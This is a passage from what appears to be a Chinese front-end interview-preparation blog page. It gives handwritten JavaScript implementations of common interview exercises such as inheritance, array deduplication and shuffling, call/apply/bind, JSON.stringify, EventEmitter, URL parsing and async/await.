返回创建的对象。</span></span><br><span class="line">  <span class="keyword">return</span> obj;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">// 使用方法</span></span><br><span class="line">objectFactory(构造函数, 初始化参数);</span><br></pre></td></tr></table></figure><h2 id="实现继承（高频）"><a href="#实现继承（高频）" class="headerlink" title="实现继承（高频）"></a>实现继承（高频）</h2><h3 id="原型继承实现？"><a href="#原型继承实现？" class="headerlink" title="原型继承实现？"></a>原型继承实现？</h3><p>实现Object.create方法：将传入的对象作为原型</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">create</span>(<span class="params">proto</span>) </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">Fn</span>(<span class="params"></span>) </span>&#123;&#125;;</span><br><span class="line">    <span class="comment">// 将原型挂在构造函数的prototype上</span></span><br><span class="line">    Fn.prototype = proto;</span><br><span class="line">    Fn.prototype.constructor = Fn;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> Fn();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/07/21/LaBIgJHGTkNV8QO.jpg" alt="Snipaste_2021-07-21_17-18-35.jpg"></p><h3 id="寄生式组合继承实现？"><a href="#寄生式组合继承实现？" class="headerlink" title="寄生式组合继承实现？"></a>寄生式组合继承实现？</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Person</span>(<span class="params">name</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">this</span>.name = name;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Person.prototype.sayName = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">&quot;My name is &quot;</span> + <span class="built_in">this</span>.name + <span class="string">&quot;.&quot;</span>);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Student</span>(<span class="params">name, grade</span>) </span>&#123;</span><br><span class="line">  Person.call(<span class="built_in">this</span>, name);</span><br><span class="line">  <span class="built_in">this</span>.grade = grade;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Student.prototype = <span class="built_in">Object</span>.create(Person.prototype);</span><br><span class="line">Student.prototype.constructor = Student;</span><br><span class="line"></span><br><span class="line">Student.prototype.sayMyGrade = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">&quot;My grade is &quot;</span> + <span class="built_in">this</span>.grade + <span class="string">&quot;.&quot;</span>);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="实现数组去重？（高频）"><a href="#实现数组去重？（高频）" class="headerlink" title="实现数组去重？（高频）"></a>实现数组去重？（高频）</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 如下数组：</span></span><br><span class="line"><span class="keyword">var</span> array = [<span class="number">1</span>,  <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="literal">null</span>, <span class="literal">null</span>, <span class="literal">undefined</span>, <span class="literal">undefined</span>, <span class="keyword">new</span> <span class="built_in">String</span>(<span class="string">&#x27;1&#x27;</span>), <span class="keyword">new</span> <span class="built_in">String</span>(<span class="string">&#x27;1&#x27;</span>), <span class="regexp">/a/</span>, <span class="regexp">/a/</span>, <span class="literal">NaN</span>, <span class="literal">NaN</span>];</span><br></pre></td></tr></table></figure><ol><li><p>Set</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> unique_1 = <span class="function"><span class="params">arr</span> =&gt;</span> [...new <span class="built_in">Set</span>(arr)]</span><br><span class="line"><span class="comment">// 例子:</span></span><br><span class="line"><span class="keyword">let</span> fn = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> Arr_new = [].concat.apply([],<span class="built_in">arguments</span>)</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">Array</span>.from(<span class="keyword">new</span> <span class="built_in">Set</span>(Arr_new))</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> demo1 = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>], demo2 = [<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">2</span>], demo3 = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>];</span><br><span class="line"><span class="built_in">console</span>.log(fn(demo1,demo2,demo3))<span class="comment">// [1,2,3,4,5,6]</span></span><br></pre></td></tr></table></figure></li><li><p>filter</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">unique_2</span>(<span class="params">array</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> res = array.filter(<span class="function"><span class="keyword">function</span> (<span class="params">item, index, array</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> array.indexOf(item) === index;</span><br><span class="line">  &#125;)</span><br><span class="line">  <span class="keyword">return</span> res</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>reduce</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> unique_3 = <span class="function"><span class="params">arr</span> =&gt;</span> arr.reduce(<span class="function">(<span class="params">pre, cur</span>) =&gt;</span> pre.includes(cur) ? pre : [...pre, cur],[]);</span><br></pre></td></tr></table></figure></li><li><p>双重 for 循环</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">unique_4</span>(<span class="params">array</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; array.length; i++) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> j = i + <span class="number">1</span>; j &lt; array.length; j++) &#123;</span><br><span class="line">      <span class="keyword">if</span> (array[i] === array[j]) &#123;</span><br><span class="line">        array.splice(j, <span class="number">1</span>);</span><br><span class="line">        j--;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> array</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>Object 键值对**(效果最好)**</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">unique_5</span>(<span class="params">array</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> obj = &#123;&#125;;</span><br><span class="line">  <span class="keyword">return</span> array.filter(<span class="function"><span class="keyword">function</span> (<span class="params">item, index, array</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> obj.hasOwnProperty(<span class="keyword">typeof</span> item + item) ? <span class="literal">false</span> : (obj[<span class="keyword">typeof</span> item + item] = <span class="literal">true</span>)</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><h2 id="实现数组-map（高频）"><a href="#实现数组-map（高频）" class="headerlink" title="实现数组 map（高频）"></a>实现数组 map（高频）</h2><p>通过 <code>reduce</code> ：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> arr = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]</span><br><span class="line"><span class="keyword">const</span> mapArray = arr.map(<span class="function"><span class="params">value</span> =&gt;</span> value * <span class="number">2</span>)</span><br><span class="line"><span class="keyword">const</span> reduceArray = arr.reduce(<span class="function">(<span class="params">acc, current</span>) =&gt;</span> &#123;</span><br><span class="line">  acc.push(current * <span class="number">2</span>)</span><br><span class="line">  <span class="keyword">return</span> acc</span><br><span class="line">&#125;, [])</span><br><span class="line"><span class="built_in">console</span>.log(mapArray, reduceArray) <span class="comment">// [2, 4, 6]</span></span><br></pre></td></tr></table></figure><h2 id="实现数组的随机排序？（2种方法，高频）"><a href="#实现数组的随机排序？（2种方法，高频）" class="headerlink" title="实现数组的随机排序？（2种方法，高频）"></a>实现数组的随机排序？（2种方法，高频）</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// （1）使用数组 sort 方法对数组元素随机排序，让 Math.random() 出来的数与 0.5 比较，如果大于就返回 1 交换位置，如果小于就返回 -1，不交换位置。</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">randomSort</span>(<span class="params">a, b</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">Math</span>.random() &gt; <span class="number">0.5</span> ? -<span class="number">1</span> : <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//  缺点：每个元素被派到新数组的位置不是随机的，原因是 sort() 方法是依次比较的。</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// （2）随机从原数组抽取一个元素，加入到新数组</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">randomSort</span>(<span class="params">arr</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> result = [];</span><br><span class="line">  <span class="keyword">while</span> (arr.length &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> randomIndex = <span class="built_in">Math</span>.floor(<span class="built_in">Math</span>.random() * arr.length);</span><br><span class="line">    result.push(arr[randomIndex]);</span><br><span class="line">    arr.splice(randomIndex, <span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// （3）随机交换数组内的元素（洗牌算法类似）</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">randomSort</span>(<span class="params">array</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> length = array.length;</span><br><span class="line">  <span class="keyword">if</span> (!<span class="built_in">Array</span>.isArray(array) || length &lt;= <span class="number">1</span>) <span class="keyword">return</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> index = <span class="number">0</span>; index &lt; length - <span class="number">1</span>; index++) &#123;</span><br><span class="line">    <span class="keyword">let</span> randomIndex = <span class="built_in">Math</span>.floor(<span class="built_in">Math</span>.random() * (length - index)) + index;</span><br><span class="line">    [array[index], array[randomIndex]] = [array[randomIndex], array[index]];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> array;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="手写-call、apply-及-bind-函数（apply高频）"><a href="#手写-call、apply-及-bind-函数（apply高频）" class="headerlink" title="手写 call、apply 及 bind 函数（apply高频）"></a>手写 call、apply 及 bind 函数（apply高频）</h2><p>call 函数的实现步骤：</p><ul><li>判断调用对象是否为函数，即使我们是定义在函数的原型上的，但是可能出现使用 call 等方式调用的情况。</li><li>判断传入上下文对象是否存在，如果不存在，则设置为 window 。</li><li>处理传入的参数，截取第一个参数后的所有参数。</li><li>将函数作为上下文对象的一个属性。</li><li>使用上下文对象来调用这个方法，并保存返回结果。</li><li>删除刚才新增的属性。</li><li>返回结果。</li></ul><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Function</span>.prototype.myCall = <span class="function"><span class="keyword">function</span> (<span class="params">context</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// 判断调用对象</span></span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">typeof</span> <span class="built_in">this</span> !== <span class="string">&quot;function&quot;</span>) &#123;</span><br><span class="line">    <span class="built_in">console</span>.error(<span class="string">&quot;type error&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// 如果没有传或传的值为空对象 context 指向 window</span></span><br><span class="line">  context = context || <span class="built_in">window</span></span><br><span class="line">  <span class="comment">// fn 需要是一个唯一值</span></span><br><span class="line">  <span class="keyword">let</span> fn = <span class="built_in">Symbol</span>(context), result=<span class="literal">null</span></span><br><span class="line">  <span class="comment">// 给 context 添加一个方法 指向 this (this就是触发的函数)</span></span><br><span class="line">  context[fn] = <span class="built_in">this</span></span><br><span class="line">  <span class="comment">// 处理参数 去除第一个参数this 其它传入fn函数</span></span><br><span class="line">  <span class="keyword">let</span> args = [...arguments].slice(<span class="number">1</span>)</span><br><span class="line">  <span class="comment">// 执行 fn</span></span><br><span class="line">  result = context[fn](...args)</span><br><span class="line">  <span class="comment">// 删除方法</span></span><br><span class="line">  <span class="keyword">delete</span> context[fn] </span><br><span class="line">  <span class="keyword">return</span> result</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>apply 函数的实现步骤：</p><ul><li>判断调用对象是否为函数，即使我们是定义在函数的原型上的，但是可能出现使用 call 等方式调用的情况。</li><li>判断传入上下文对象是否存在，如果不存在，则设置为 window 。</li><li>将函数作为上下文对象的一个属性。</li><li>判断参数值是否传入</li><li>使用上下文对象来调用这个方法，并保存返回结果。</li><li>删除刚才新增的属性</li><li>返回结果</li></ul><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Function</span>.prototype.myApply = <span class="function"><span class="keyword">function</span> (<span class="params">context</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">typeof</span> <span class="built_in">this</span> !== <span class="string">&quot;function&quot;</span>) &#123;</span><br><span class="line">    <span class="built_in">console</span>.error(<span class="string">&quot;type error&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  context = context || <span class="built_in">window</span></span><br><span class="line">  <span class="keyword">let</span> fn = <span class="built_in">Symbol</span>(context), result=<span class="literal">null</span></span><br><span class="line">  context[fn] = <span class="built_in">this</span></span><br><span class="line">  <span class="keyword">let</span> arg = [...arguments].slice(<span class="number">1</span>)</span><br><span class="line">  result = context[fn](arg)</span><br><span class="line">  <span class="keyword">delete</span> context[fn]</span><br><span class="line">  <span class="keyword">return</span> result</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>bind 函数的实现步骤：</p><ul><li>判断调用对象是否为函数，即使我们是定义在函数的原型上的，但是可能出现使用 call 等方式调用的情况。</li><li>保存当前函数的引用，获取其余传入参数值。</li><li>创建一个函数返回</li><li>函数内部使用 apply 来绑定函数调用，需要判断函数作为构造函数的情况，这个时候需要传入当前函数的 this 给 apply 调用，其余情况都传入指定的上下文对象。</li></ul><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Function</span>.prototype.myBind = <span class="function"><span class="keyword">function</span> (<span class="params">context, ...args</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// 判断调用对象是否为函数</span></span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">typeof</span> <span class="built_in">this</span> !== <span class="string">&quot;function&quot;</span>) &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">TypeError</span>(<span class="string">&quot;Error&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// 返回一个函数</span></span><br><span class="line">  <span class="keyword">return</span> <span class="function">(<span class="params">...newArgs</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">// 由于支持柯里化形式传参, newArgs 保存第二次参数</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.call(context,...args, ...newArgs)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 输出？(todo)</span></span><br><span class="line"><span class="keyword">const</span> obj = &#123;</span><br><span class="line">    <span class="attr">base</span>: <span class="number">42</span>,</span><br><span class="line">    <span class="function"><span class="title">add</span>(<span class="params">...nums</span>)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> nums.reduce(<span class="function">(<span class="params">s, i</span>) =&gt;</span> i + s, <span class="built_in">this</span>.base || <span class="number">0</span>);</span><br><span class="line">    &#125;,</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">const</span> f1 = obj.add.bind(&#123; <span class="attr">base</span>: <span class="number">3</span> &#125;, [<span class="number">0</span>]);</span><br><span class="line"><span class="keyword">const</span> f2 = obj.add.bind(&#123;&#125;,<span class="number">1</span>);</span><br><span class="line"><span class="keyword">const</span> f3 = obj.add.bind(&#123; <span class="attr">base</span>: <span class="number">2</span> &#125;, [<span class="number">1</span>]);</span><br><span class="line"><span class="built_in">console</span>.log(f1(<span class="number">2</span>), f2(<span class="number">2</span>), f3(<span class="number">2</span>)); <span class="comment">//203,3,212</span></span><br></pre></td></tr></table></figure><h2 id="实现JSON-的stringify函数"><a href="#实现JSON-的stringify函数" class="headerlink" title="实现JSON 的stringify函数"></a>实现JSON 的stringify函数</h2><p>腾讯实习二面</p><p>具体见<a href="https://juejin.cn/post/6844904001801027592#heading-5">https://juejin.cn/post/6844904001801027592#heading-5</a></p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 数据类型判断</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getType</span>(<span class="params">attr</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> type = <span class="built_in">Object</span>.prototype.toString.call(attr);</span><br><span class="line">  <span class="keyword">let</span> newType = type.substr(<span class="number">8</span>, type.length - <span class="number">9</span>);</span><br><span class="line">  <span class="keyword">return</span> newType;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 转换函数</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">StringIfy</span>(<span class="params">obj</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// 如果是非object类型 or null的类型直接返回 原值的String</span></span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">typeof</span> obj !== <span class="string">&quot;object&quot;</span> || getType(obj) === <span class="literal">null</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">String</span>(obj);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// 声明一个数组</span></span><br><span class="line">  <span class="keyword">let</span> json = [];</span><br><span class="line">  <span class="comment">// 判断当前传入参数是对象还是数组</span></span><br><span class="line">  <span class="keyword">let</span> arr = obj ? getType(obj) === <span class="string">&quot;Array&quot;</span> : <span class="literal">false</span>;</span><br><span class="line">  <span class="comment">// 循环对象属性</span></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> key <span class="keyword">in</span> obj) &#123;</span><br><span class="line">    <span class="comment">// 判断属性是否在对象本身上</span></span><br><span class="line">    <span class="keyword">if</span> (obj.hasOwnProperty(key)) &#123;</span><br><span class="line">      <span class="comment">// 获取属性并且判断属性值类型</span></span><br><span class="line">      <span class="keyword">let</span> item = obj[key];</span><br><span class="line">      <span class="comment">// 如果为object类型递归调用</span></span><br><span class="line">      <span class="keyword">if</span> (getType(obj) === <span class="string">&quot;Object&quot;</span>) &#123;</span><br><span class="line">        <span class="comment">// consoarrle.log(item)</span></span><br><span class="line">        item = StringIfy(item);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="comment">// 拼接数组字段</span></span><br><span class="line">      json.push((arr ? <span class="string">&#x27;&quot;&#x27;</span> : <span class="string">&#x27;&quot;&#x27;</span> + key + <span class="string">&#x27;&quot;: &quot;&#x27;</span>) + <span class="built_in">String</span>(item) + <span class="string">&#x27;&quot;&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">console</span>.log(arr, <span class="built_in">String</span>(json));</span><br><span class="line">  <span class="comment">// 转换数组字段为字符串</span></span><br><span class="line">  <span class="keyword">return</span> (arr ? <span class="string">&quot;[&quot;</span> : <span class="string">&quot;&#123;&quot;</span>) + <span class="built_in">String</span>(json) + (arr ? <span class="string">&quot;]&quot;</span> : <span class="string">&quot;&#125;&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="EventEmitter-实现（高频）"><a href="#EventEmitter-实现（高频）" class="headerlink" title="EventEmitter 实现（高频）"></a>EventEmitter 实现（高频）</h2><p>组件通信：一个触发与监听的过程</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">EventEmitter</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="title">constructor</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">    <span class="comment">// 存储事件</span></span><br><span class="line">    <span class="built_in">this</span>.events = &#123;&#125;;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="title">on</span>(<span class="params">event, callback</span>)</span> &#123;</span><br><span class="line">    <span class="keyword">let</span> callbacks = <span class="built_in">this</span>.events[event] || [];</span><br><span class="line">    callbacks.push(callback);</span><br><span class="line">    <span class="built_in">this</span>.events[event] = callbacks;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="title">off</span>(<span class="params">event, callback</span>)</span> &#123;</span><br><span class="line">    <span class="keyword">let</span> callbacks = <span class="built_in">this</span>.events[event];</span><br><span class="line">    <span class="built_in">this</span>.events[event] = callbacks &amp;&amp; callbacks.filter(<span class="function"><span class="params">fn</span> =&gt;</span> fn !== callback);</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// 触发事件</span></span><br><span class="line">  <span class="function"><span class="title">emit</span>(<span class="params">event, ...args</span>)</span> &#123;</span><br><span class="line">    <span class="keyword">let</span> callbacks = <span class="built_in">this</span>.events[event];</span><br><span class="line">    callbacks.forEach(<span class="function"><span class="params">fn</span> =&gt;</span> &#123;</span><br><span class="line">      fn(...args);</span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="title">once</span>(<span class="params">event, callback</span>)</span> &#123;</span><br><span class="line">    <span class="keyword">let</span> wrapFun = <span class="function">(<span class="params">...args</span>) =&gt;</span> &#123;</span><br><span class="line">      callback(...args);</span><br><span class="line"></span><br><span class="line">      <span class="built_in">this</span>.off(event, wrapFun);</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="built_in">this</span>.on(event, wrapFun);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="手写-url-参数解析（高频）"><a href="#手写-url-参数解析（高频）" class="headerlink" title="手写 url 参数解析（高频）"></a>手写 url 参数解析（高频）</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//拆分字符串形式</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">queryToObj</span>(<span class="params">url</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">const</span> res = &#123;&#125;;</span><br><span class="line">    <span class="keyword">const</span> search = url.split(<span class="string">&quot;?&quot;</span>)[<span class="number">1</span>]; <span class="comment">//去掉前面的“?”</span></span><br><span class="line">    search.split(<span class="string">&quot;&amp;&quot;</span>).forEach(<span class="function">(<span class="params">paramStr</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">const</span> arr = paramStr.split(<span class="string">&quot;=&quot;</span>);</span><br><span class="line">        <span class="keyword">const</span> key = arr[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">const</span> val = arr[<span class="number">1</span>];</span><br><span class="line">        res[key] = val;</span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 正则</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getUrlParams</span>(<span class="params">url</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> reg = <span class="regexp">/([^?&amp;=]+)=([^?&amp;=]+)/g</span>;</span><br><span class="line">    <span class="keyword">let</span> obj = &#123;&#125;;</span><br><span class="line">    url.replace(reg, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        obj[<span class="built_in">arguments</span>[<span class="number">1</span>]] = <span class="built_in">arguments</span>[<span class="number">2</span>];</span><br><span class="line">    &#125;)</span><br><span class="line">    <span class="keyword">return</span> obj;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="手写-async-await（高频）"><a href="#手写-async-await（高频）" class="headerlink" title="手写 async/await（高频）"></a>手写 async/await（高频）</h2><p>具体见：<a href="https://blog.csdn.net/xgangzai/article/details/106536325">https://blog.csdn.net/xgangzai/article/details/106536325</a></p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">asyncToGenerator</span>(<span class="params">generatorFunc</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">      <span class="keyword">const</span> gen = generatorFunc.apply(<span class="built_in">this</span>, <span class="built_in">arguments</span>)</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">step</span>(<span class="params">key, arg</span>) </span>&#123;</span><br><span class="line">          <span class="keyword">let</span> generatorResult</span><br><span class="line">          <span class="keyword">try</span> &#123;</span><br><span class="line">            generatorResult = gen[key](arg)</span><br><span class="line">          &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">            <span class="keyword">return</span> reject(error)</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">const</span> &#123; value, done &#125; = generatorResult</span><br><span class="line">          <span class="keyword">if</span> (done) &#123;</span><br><span class="line">            <span class="keyword">return</span> resolve(value)</span><br><span class="line">          &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">Promise</span>.resolve(value).then(<span class="function"><span class="params">val</span> =&gt;</span> step(<span class="string">&#x27;next&#x27;</span>, val), <span class="function"><span class="params">err</span> =&gt;</span> step(<span class="string">&#x27;throw&#x27;</span>, err))</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        step(<span class="string">&quot;next&quot;</span>)</span><br><span class="line">      &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="将js对象转化为树形结构（▲▲）"><a href="#将js对象转化为树形结构（▲▲）" class="headerlink" title="将js对象转化为树形结构（▲▲）"></a>将js对象转化为树形结构（▲▲）</h2><p>参考自 <a href="https://juejin.cn/post/6946136940164939813#heading-47">https://juejin.cn/post/6946136940164939813#heading-47</a></p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 转换前：</span></span><br><span class="line">source = [&#123;</span><br><span class="line">            <span class="attr">id</span>: <span class="number">1</span>,</span><br><span class="line">            <span class="attr">pid</span>: <span class="number">0</span>,</span><br><span class="line">            <span class="attr">name</span>: <span class="string">&#x27;body&#x27;</span></span><br><span class="line">          &#125;, &#123;</span><br><span class="line">            <span class="attr">id</span>: <span class="number">2</span>,</span><br><span class="line">            <span class="attr">pid</span>: <span class="number">1</span>,</span><br><span class="line">            <span class="attr">name</span>: <span class="string">&#x27;title&#x27;</span></span><br><span class="line">          &#125;, &#123;</span><br><span class="line">            <span class="attr">id</span>: <span class="number">3</span>,</span><br><span class="line">            <span class="attr">pid</span>: <span class="number">2</span>,</span><br><span class="line">            <span class="attr">name</span>: <span class="string">&#x27;div&#x27;</span></span><br><span class="line">          &#125;]</span><br><span class="line"><span class="comment">// 转换为: </span></span><br><span class="line">tree = [&#123;</span><br><span class="line">          <span class="attr">id</span>: <span class="number">1</span>,</span><br><span class="line">          <span class="attr">pid</span>: <span class="number">0</span>,</span><br><span class="line">          <span class="attr">name</span>: <span class="string">&#x27;body&#x27;</span>,</span><br><span class="line">          <span class="attr">children</span>: [&#123;</span><br><span class="line">            <span class="attr">id</span>: <span class="number">2</span>,</span><br><span class="line">            <span class="attr">pid</span>: <span class="number">1</span>,</span><br><span class="line">            <span class="attr">name</span>: <span class="string">&#x27;title&#x27;</span>,</span><br><span class="line">            <span class="attr">children</span>: [&#123;</span><br><span class="line">              <span class="attr">id</span>: <span class="number">3</span>,</span><br><span class="line">              <span class="attr">pid</span>: <span class="number">1</span>,</span><br><span class="line">              <span class="attr">name</span>: <span class="string">&#x27;div&#x27;</span></span><br><span class="line">            &#125;]</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;]</span><br></pre></td></tr></table></figure><p>代码实现：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">jsonToTree</span>(<span class="params">data</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// 初始化结果数组，并判断输入数据的格式</span></span><br><span class="line">  <span class="keyword">let</span> result = []</span><br><span class="line">  <span class="keyword">if</span>(!<span class="built_in">Array</span>.isArray(data)) &#123;</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// 使用map，将当前对象的id与当前对象对应存储起来</span></span><br><span class="line">  <span class="keyword">let</span> map = &#123;&#125;;</span><br><span class="line">  data.forEach(<span class="function"><span class="params">item</span> =&gt;</span> &#123;</span><br><span class="line">    map[item.id] = item;</span><br><span class="line">    <span class="keyword">let</span> parent = map[item.pid];</span><br><span class="line">    <span class="keyword">if</span>(parent) &#123;</span><br><span class="line">      